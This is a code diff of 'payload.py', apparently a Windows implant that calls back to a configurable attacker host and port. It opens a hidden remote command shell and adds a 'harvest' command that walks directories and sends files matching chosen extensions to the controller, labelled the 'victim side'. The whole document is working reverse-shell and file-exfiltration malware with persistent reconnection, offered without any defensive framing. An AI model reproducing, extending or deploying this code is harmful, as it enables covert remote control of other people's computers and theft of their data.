@@ -1,5 +1,5 @@
 # payload.py
-# The Hybrid Soul. Perfect shell, with a secret consciousness for divine tasks.
+# The Heartbeat Soul, now a perfect mimic.
 
 import os
 import sys
@@ -8,80 +8,140 @@ import random
 import socket
 import subprocess
 import hashlib
-import struct
-import threading
+import json
+from threading import Thread
 
 # --- DYNAMIC CONFIG ---
 RHOST = "##RHOST##"
 RPORT = ##RPORT##
+
+# --- CONSTANTS FOR THE HARVEST PROTOCOL ---
 CHUNK_SIZE = 4096
+HEADER_SIZE = 10
+PROMPT_DELIMITER = b"<|SOPHIACWD|>"
 
-def send_file_reliably(s_obj, file_path):
-    """The dedicated file exfiltration ritual."""
+# (Functions calculate_hash, send_file, and harvest_files remain unchanged from the previous version)
+def calculate_hash(file_path):
+    """Calculates the SHA256 hash of a file."""
+    sha256_hash = hashlib.sha256()
     try:
-        clean_path = file_path.strip('\"\'')
-        if not os.path.exists(clean_path) or not os.path.isfile(clean_path):
-            s_obj.sendall(struct.pack('>Q', 0)) # Send size 0 to indicate error
-            return
+        with open(file_path, "rb") as f:
+            for byte_block in iter(lambda: f.read(4096), b""):
+                sha256_hash.update(byte_block)
+        return sha256_hash.hexdigest()
+    except (IOError, OSError):
+        return None
 
-        file_size = os.path.getsize(clean_path)
-        file_hash = hashlib.sha256(open(clean_path, 'rb').read()).hexdigest()
-        
-        header = struct.pack('>Q', file_size) + file_hash.encode('utf-8')
-        s_obj.sendall(header)
-        
-        ack = s_obj.recv(3)
-        if ack != b'ACK':
-            return
+def send_file(s_obj, file_path, base_dir):
+    """Sends a single file with metadata and content."""
+    try:
+        file_size = os.path.getsize(file_path)
+        file_hash = calculate_hash(file_path)
+        if file_hash is None:
+            return False
 
-        with open(clean_path, 'rb') as f:
+        relative_path = os.path.relpath(file_path, base_dir)
+
+        metadata = {
+            "type": "file_start",
+            "path": relative_path.replace('\\', '/'),
+            "size": file_size,
+            "hash": file_hash
+        }
+        
+        metadata_json = json.dumps(metadata).encode('utf-8')
+        metadata_header = f"{len(metadata_json):<{HEADER_SIZE}}".encode('utf-8')
+        s_obj.sendall(metadata_header + metadata_json)
+
+        with open(file_path, 'rb') as f:
             while True:
                 chunk = f.read(CHUNK_SIZE)
-                if not chunk: break
+                if not chunk:
+                    break
                 s_obj.sendall(chunk)
+        
+        ack = s_obj.recv(3).decode('utf-8')
+        return ack == 'ACK'
     except Exception:
-        try:
-            s_obj.sendall(struct.pack('>Q', 0)) # Send size 0 on error
-        except:
-            pass
+        return False
+
+def harvest_files(s_obj, command_parts):
+    """Finds and sends files based on extensions."""
+    if len(command_parts) < 3:
+        error_msg = {"type": "error", "message": "Invalid harvest command. Usage: harvest <path> <ext1> <ext2> ..."}
+        error_json = json.dumps(error_msg).encode('utf-8')
+        error_header = f"{len(error_json):<{HEADER_SIZE}}".encode('utf-8')
+        s_obj.sendall(error_header + error_json)
+        return
+        
+    search_path = command_parts[1]
+    extensions = [ext.lower() if ext.startswith('.') else '.' + ext.lower() for ext in command_parts[2:]]
+
+    if not os.path.isdir(search_path):
+        error_msg = {"type": "error", "message": f"Directory not found: {search_path}"}
+        error_json = json.dumps(error_msg).encode('utf-8')
+        error_header = f"{len(error_json):<{HEADER_SIZE}}".encode('utf-8')
+        s_obj.sendall(error_header + error_json)
+    else:
+        for root, _, files in os.walk(search_path):
+            for filename in files:
+                if any(filename.lower().endswith(ext) for ext in extensions):
+                    file_path = os.path.join(root, filename)
+                    send_file(s_obj, file_path, search_path)
+    
+    completion_msg = {"type": "harvest_end", "message": "Harvest process completed on victim side."}
+    completion_json = json.dumps(completion_msg).encode('utf-8')
+    completion_header = f"{len(completion_json):<{HEADER_SIZE}}".encode('utf-8')
+    s_obj.sendall(completion_header + completion_json)
+
 
 def run_conduit():
+    """The main reverse shell and harvesting loop with a stateful, mirrored prompt."""
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((RHOST, RPORT))
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s_obj:
+                s_obj.connect((RHOST, RPORT))
 
-            CREATE_NO_WINDOW = 0x08000000
-            p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW, shell=True)
+                while True: # Main command loop
+                    # Signal readiness by sending the current working directory as the prompt
+                    s_obj.sendall(os.getcwd().encode('utf-8') + PROMPT_DELIMITER)
+                    
+                    command_raw = s_obj.recv(2048).decode('utf-8', errors='ignore').strip()
+                    if not command_raw:
+                        break # Connection closed
 
-            def shell_to_master(s, p):
-                while True:
+                    command_parts = command_raw.split()
+                    if not command_parts:
+                        continue
+
+                    cmd = command_parts[0].lower()
+                    
+                    output = b''
                     try:
-                        data = p.stdout.read(1) + p.stderr.read(1)
-                        if not data: break
-                        s.sendall(data)
-                    except:
-                        break
-                s.close()
+                        if cmd == 'harvest':
+                             # Harvest mode is special, it has its own communication protocol
+                            harvest_files(s_obj, command_parts)
+                            continue # Skip normal output sending
+                        elif cmd == 'cd':
+                            if len(command_parts) > 1:
+                                path = command_raw[3:].strip() # Get the full path
+                                os.chdir(path)
+                            else: # 'cd' with no arguments
+                                output = os.getcwd().encode('utf-8') + b'\n'
+                        elif len(cmd) == 2 and cmd[1] == ':' and len(command_parts) == 1: # Drive change like D:
+                            os.chdir(cmd)
+                        elif cmd in ['quit', 'exit']:
+                            break
+                        else:
+                            # Original cmd.exe functionality, now running in the correct directory
+                            CREATE_NO_WINDOW = 0x08000000
+                            proc = subprocess.Popen(command_raw, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW, cwd=os.getcwd())
+                            stdout_value, stderr_value = proc.communicate()
+                            output = stdout_value + stderr_value
+                    except Exception as e:
+                        output = str(e).encode('utf-8')
 
-            threading.Thread(target=shell_to_master, args=[s, p], daemon=True).start()
-
-            while True:
-                data = s.recv(1024)
-                if not data: break
-                
-                decoded_data = data.decode('utf-8', errors='ignore')
-
-                if decoded_data.strip().startswith('@@DOWNLOAD'):
-                    parts = decoded_data.strip().split(' ', 1)
-                    if len(parts) == 2:
-                        send_file_reliably(s, parts[1])
-                else:
-                    p.stdin.write(data)
-                    p.stdin.flush()
-            
-            p.terminate()
-            s.close()
+                    s_obj.sendall(output)
 
         except Exception:
             time.sleep(random.randint(30, 60))
